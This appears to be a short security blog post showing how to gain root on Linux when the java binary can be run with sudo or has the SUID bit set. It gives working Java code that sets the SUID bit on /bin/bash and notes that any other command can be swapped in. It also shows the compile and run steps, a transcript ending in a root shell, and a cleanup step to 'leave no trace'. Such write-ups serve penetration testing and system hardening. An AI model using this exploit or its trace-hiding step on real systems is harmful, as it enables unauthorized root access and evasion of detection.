---
layout: single
title: How to Privesc with java sudo/SUID
excerpt: "Short post in which I explain how to use java with sudo or with the SUID bit to privilege escalate"
date: 2022-09-25
classes: wide
header:
  teaser: /assets/images/java_privesc/java_logo.png
  teaser_home_page: true
categories:
  - privesc
tags:
  - real life
  - java
  - sudo
  - SUID
---

![](/assets/images/java_privesc/java.png)

# Java Privesc


I'm writing this since I found this in a real-life scenario and I couldn't find any guide online on how to do privilege escalation with java when you have sudo or SUID.

So for this technique we need either sudo (with or without password) or the SUID bit set in the java binary. Then we can compile this malicious java code that will set the SUID bit to /bin/bash although if you want to execute another command just change the corresponding line. I suggest you compile the code in the victim's machine so you don't get any version mismatch error. The code is just.


```java
import java.io.*;
class privesc{
    public static void main(String args[]){
            try{
                String cmd = "chmod u+s /bin/bash";
                Runtime run = Runtime.getRuntime();
                Process pr = run.exec(cmd);
                try{
                        pr.waitFor();
                }
                catch(InterruptedException e){
                    System.out.println("error");
                }
        //      BufferedReader buf = new BufferedReader(new InputStreamReader(pr.getInputStream()));
        //      String line = "";
        //      while ((line=buf.readLine())!=null) {
        //              System.out.println(line);
        //      }
            }
            catch (IOException e) {
                    System.out.println("error");
        }
    }
}
```

To change the command that gets executed just change the `String cmd` variable. Also if you want to display STDOUT uncomment the commented lines. Now just compile it like this.

```shell
javac privesc.java
```

And a new file called `privesc.class` will appear just execute it with java and get the root shell.

```shell
[dasor@archlinux ~/tmp]$ sudo java privesc
[dasor@archlinux ~/tmp]$ ls -la /bin/bash
-rwsr-xr-x 1 root root 927K Jan  8  2022 /bin/bash
[dasor@archlinux ~/tmp]$ bash -p
bash-5.1# whoami
root
```
 Now if you want to reset bash permission to leave no trace use.

 ```shell
bash-5.1# chmod 755 /bin/bash
bash-5.1# ls -la /bin/bash
-rwxr-xr-x 1 root root 948624 Jan  8  2022 /bin/bash
 ```

And that is all enjoy your new shell with responsibility! and if you find this in a real-life scenario be a good white hat and report it.
